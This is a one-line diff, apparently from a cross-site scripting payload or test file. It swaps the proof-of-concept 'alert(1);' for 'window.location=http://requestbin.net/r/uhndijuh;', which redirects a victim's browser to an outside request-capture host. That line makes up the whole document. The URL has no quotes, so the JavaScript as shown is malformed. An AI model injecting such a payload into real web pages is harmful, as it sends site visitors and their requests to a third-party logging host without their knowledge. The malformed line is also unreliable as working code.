@@ -1,1 +1,1 @@
-alert(1);
+window.location=http://requestbin.net/r/uhndijuh;
